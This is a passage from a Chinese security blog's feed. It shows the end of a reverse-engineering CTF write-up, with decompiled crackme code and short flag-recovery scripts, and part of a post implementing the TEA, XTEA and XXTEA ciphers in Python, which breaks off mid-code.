class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> *v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">int</span> *v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v16; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> *v17; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+Ch] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v21; <span class="comment">// [esp+10h] [ebp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> *v22; <span class="comment">// [esp+14h] [ebp-A4h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v23; <span class="comment">// [esp+18h] [ebp-A0h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+1Ch] [ebp-9Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [esp+20h] [ebp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [esp+24h] [ebp-94h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [esp+28h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [esp+2Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [esp+30h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [esp+34h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [esp+38h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+3Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [esp+40h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+44h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// [esp+48h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [esp+4Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v37[<span class="number">3</span>]; <span class="comment">// [esp+50h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v39; <span class="comment">// [esp+68h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [esp+6Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// [esp+70h] [ebp-48h]</span></span><br><span class="line">  __int16 v42; <span class="comment">// [esp+74h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v43; <span class="comment">// [esp+78h] [ebp-40h]</span></span><br><span class="line">  __int16 v44; <span class="comment">// [esp+7Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v45; <span class="comment">// [esp+7Eh] [ebp-3Ah]</span></span><br><span class="line">  <span class="keyword">int</span> v46; <span class="comment">// [esp+82h] [ebp-36h]</span></span><br><span class="line">  <span class="keyword">int</span> v47; <span class="comment">// [esp+86h] [ebp-32h]</span></span><br><span class="line">  __int16 v48; <span class="comment">// [esp+8Ah] [ebp-2Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v49; <span class="comment">// [esp+8Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v50; <span class="comment">// [esp+90h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v51; <span class="comment">// [esp+91h] [ebp-27h]</span></span><br><span class="line">  <span class="keyword">int</span> v52; <span class="comment">// [esp+95h] [ebp-23h]</span></span><br><span class="line">  <span class="keyword">int</span> v53; <span class="comment">// [esp+99h] [ebp-1Fh]</span></span><br><span class="line">  __int16 v54; <span class="comment">// [esp+9Dh] [ebp-1Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v55; <span class="comment">// [esp+9Fh] [ebp-19h]</span></span><br><span class="line">  <span class="keyword">int</span> v56; <span class="comment">// [esp+A0h] [ebp-18h]</span></span><br><span class="line">  __int16 v57; <span class="comment">// [esp+A4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v58; <span class="comment">// [esp+A6h] [ebp-12h]</span></span><br><span class="line">  <span class="keyword">int</span> v59; <span class="comment">// [esp+AAh] [ebp-Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v60; <span class="comment">// [esp+AEh] [ebp-Ah]</span></span><br><span class="line">  __int16 v61; <span class="comment">// [esp+B2h] [ebp-6h]</span></span><br><span class="line"></span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v50 = <span class="number">0</span>;</span><br><span class="line">  v49 = <span class="number">6451010</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v56 = <span class="number">1819435331</span>;</span><br><span class="line">  v40 = <span class="number">1231382892</span>;</span><br><span class="line">  v43 = <span class="number">2036624961</span>;</span><br><span class="line">  v39 = <span class="number">1866884462</span>;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">0</span>;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v51 = <span class="number">0</span>;</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v53 = <span class="number">0</span>;</span><br><span class="line">  v54 = <span class="number">0</span>;</span><br><span class="line">  v55 = <span class="number">0</span>;</span><br><span class="line">  v58 = <span class="number">0</span>;</span><br><span class="line">  v59 = <span class="number">0</span>;</span><br><span class="line">  v60 = <span class="number">0</span>;</span><br><span class="line">  v61 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">2</span>;</span><br><span class="line">  v25 = <span class="number">5</span>;</span><br><span class="line">  v26 = <span class="number">9</span>;</span><br><span class="line">  v27 = <span class="number">6</span>;</span><br><span class="line">  v28 = <span class="number">7</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">10</span>;</span><br><span class="line">  v31 = <span class="number">8</span>;</span><br><span class="line">  v32 = <span class="number">12</span>;</span><br><span class="line">  v33 = <span class="number">11</span>;</span><br><span class="line">  v34 = <span class="number">3</span>;</span><br><span class="line">  v35 = <span class="number">4</span>;</span><br><span class="line">  v36 = <span class="number">1</span>;</span><br><span class="line">  v41 = <span class="number">1213493864</span>;</span><br><span class="line">  v42 = <span class="number">101</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _time64(<span class="number">0</span>);</span><br><span class="line">    srand(v23 + v3);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      *(&amp;v36 + ++v4) = rand() % <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v4 &lt; <span class="number">3</span> );</span><br><span class="line">    v5 = <span class="number">3</span>;</span><br><span class="line">    v21 = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt; <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = &amp;v49;</span><br><span class="line">        v7 = <span class="number">28</span>;</span><br><span class="line">        v8 = <span class="number">-12</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = *(&amp;v36 + v6);</span><br><span class="line">          v20 = v37[v6];</span><br><span class="line">          <span class="keyword">if</span> ( v20 &gt; v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = v22;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              v11 = *(_BYTE *)v10;</span><br><span class="line">              LOBYTE(v10[v8]) = *(_BYTE *)v10;</span><br><span class="line">              v10 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v10 + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( v11 );</span><br><span class="line">            v37[v6] = v9;</span><br><span class="line">            v12 = v22 - <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              v13 = *(_BYTE *)v12;</span><br><span class="line">              *((_BYTE *)v12 + <span class="number">20</span>) = *(_BYTE *)v12;</span><br><span class="line">              v12 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v12 + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( v13 );</span><br><span class="line">            *(&amp;v36 + v6) = v20;</span><br><span class="line">            v14 = &amp;v38;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              v15 = *v14;</span><br><span class="line">              v14[v7] = *v14;</span><br><span class="line">              ++v14;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( v15 );</span><br><span class="line">            v5 = v21;</span><br><span class="line">          &#125;</span><br><span class="line">          v22 += <span class="number">5</span>;</span><br><span class="line">          ++v6;</span><br><span class="line">          v8 -= <span class="number">5</span>;</span><br><span class="line">          v7 += <span class="number">20</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v6 &lt; v5 );</span><br><span class="line">      &#125;</span><br><span class="line">      v21 = --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &gt; <span class="number">0</span> );</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    v17 = &amp;v43;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s\t%d\n"</span>, v17, v37[v16++]);</span><br><span class="line">      v17 += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v16 &lt; <span class="number">3</span> );</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v43, <span class="string">"Andy"</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v23;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v23 &lt; <span class="number">13</span> );</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v43, <span class="string">"Andy"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v23; ++i )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%c"</span>, *((<span class="keyword">char</span> *)&amp;v39 + *(&amp;v24 + i)));</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">k = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0xA</span>, <span class="number">8</span>, <span class="number">0xC</span>, <span class="number">0xB</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line">t = <span class="string">'oFen'</span>[::<span class="number">-1</span>] + <span class="string">'Ieil'</span>[::<span class="number">-1</span>] + <span class="string">'HTrh'</span>[::<span class="number">-1</span>] + <span class="string">'e'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">flag += t[k[i]]</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file 7.exe</span><br><span class="line">7.exe: PE32 executable (console) Intel 80386, for MS Windows</span><br></pre></td></tr></table></figure><p>简单地异或一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__<span class="function">cdecl <span class="title">sub_401000</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v2; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0xA</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i )</span><br><span class="line">    v2[i] = a1[i] + <span class="number">2</span>;</span><br><span class="line">  v2[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">enc = <span class="string">'asdfghjklq'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">flag += chr(ord(enc[i]) + <span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在杭电的平台上做了几道题。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
      <category term="wp" scheme="https://qianfei11.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Python实现TEA、XTEA、XXTEA加密解密算法</title>
    <link href="https://qianfei11.github.io/2019/08/22/Python%E5%AE%9E%E7%8E%B0TEA%E3%80%81XTEA%E3%80%81XXTEA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://qianfei11.github.io/2019/08/22/Python%E5%AE%9E%E7%8E%B0TEA%E3%80%81XTEA%E3%80%81XXTEA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</id>
    <published>2019-08-22T09:00:10.000Z</published>
    <updated>2019-12-14T09:30:14.152Z</updated>
    
    <content type="html"><![CDATA[<p>闲来无事，喝杯茶冷静一下。</p><a id="more"></a><h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a><a href="https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm" target="_blank" rel="noopener">TEA</a></h1><p>微型加密算法（<code>Tiny Encryption Algorithm</code>，<code>TEA</code>）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。<code>TEA</code>操作处理在两个<code>32</code>位无符号整型上（可能源于一个<code>64</code>位数据），并且使用一个<code>128</code>位的密钥。设计者是<code>Roger Needham</code>和<code>David Wheeler</code>。</p><p>加密过程：</p><p><img src="/pics/Python实现TEA、XTEA、XXTEA加密解密算法/1.png" alt="TEA算法详解"></p><p>Python 实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(v, k)</span>:</span></span><br><span class="line">v0 = v[<span class="number">0</span>]</span><br><span class="line">v1 = v[<span class="number">1</span>]</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br><span class="line">k0 = k[<span class="number">0</span>]</span><br><span class="line">k1 = k[<span class="number">1</span>]</span><br><span class="line">k2 = k[<span class="number">2</span>]</span><br><span class="line">k3 = k[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">x += delta</span><br><span class="line">x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v[<span class="number">0</span>] = v0</span><br><span class="line">v[<span class="number">1</span>] = v1</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(v, k)</span>:</span></span><br><span class="line">v0 = v[<span class="number">0</span>]</span><br><span class="line">v1 = v[<span class="number">1</span>]</span><br><span class="line">x = <span class="number">0xC6EF3720</span></span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br><span class="line">k0 = k[<span class="number">0</span>]</span><br><span class="line">k1 = k[<span class="number">1</span>]</span><br><span class="line">k2 = k[<span class="number">2</span>]</span><br><span class="line">k3 = k[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">x -= delta</span><br><span class="line">x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v[<span class="number">0</span>] = v0</span><br><span class="line">v[<span class="number">1</span>] = v1</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">plain = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">encrypted = encrypt(plain, key)</span><br><span class="line"><span class="keyword">print</span> encrypted</span><br><span class="line">decrypted = decrypt(encrypted, key)</span><br><span class="line"><span class="keyword">print</span> decrypted</span><br></pre></td></tr></table></figure><h1 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a><a href="https://en.wikipedia.org/wiki/XTEA" target="_blank" rel="noopener">XTEA</a></h1><p><code>XTEA</code>是<code>TEA</code>的升级版，增加了更多的密钥表，移位和异或操作等等。</p><p>加密过程：</p><p><img src="/pics/Python实现TEA、XTEA、XXTEA加密解密算法/2.png" alt="XTEA算法详解"></p><p>Python 实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(rounds, v, k)</span>:</span></span><br><span class="line">v0 = v[<span class="number">0</span>]</span><br><span class="line">v1 = v[<span class="number">1</span>]</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(rounds):</span><br><span class="line">v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">x += delta</span><br><span class="line">x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v[<span class="number">0</span>] = v0</span><br><span class="line">v[<span class="number">1</span>] = v1</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(rounds, v, k)</span>:</span></span><br><span class="line">v0 = v[<span class="number">0</span>]</span><br><span class="line">v1 = v[<span class="number">1</span>]</span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br><span class="line">x = delta * rounds</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(rounds):</span><br><span class="line">v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">x -= delta</span><br><span class="line">x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v[<span class="number">0</span>] = v0</span><br><span class="line">v[<span class="number">1</span>] = v1</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">plain = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">rounds = <span class="number">32</span></span><br><span class="line">encrypted = encrypt(rounds, plain, key)</span><br><span class="line"><span class="keyword">print</span> encrypted</span><br><span class="line">decrypted = decrypt(rounds, encrypted, key)</span><br><span class="line"><span class="keyword">print</span> decrypted</span><br></pre></td></tr></table></figure><h1 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a><a href="https://en.wikipedia.org/wiki/XXTEA" target="_blank" rel="noopener">XXTEA</a></h1><p><code>XXTEA</code>，又称<code>Corrected Block TEA</code>，是<code>XTEA</code>的升级版。</p><p>加密过程：</p><p><img src="/pics/Python实现TEA、XTEA、XXTEA加密解密算法/3.png" alt="XXTEA算法详解"></p><p>Python 实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(z, y, x, k, p, e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(v, k)</span>:</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = len(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> / n</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    z = v[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(rounds):</span><br><span class="line">        x = (x + delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span 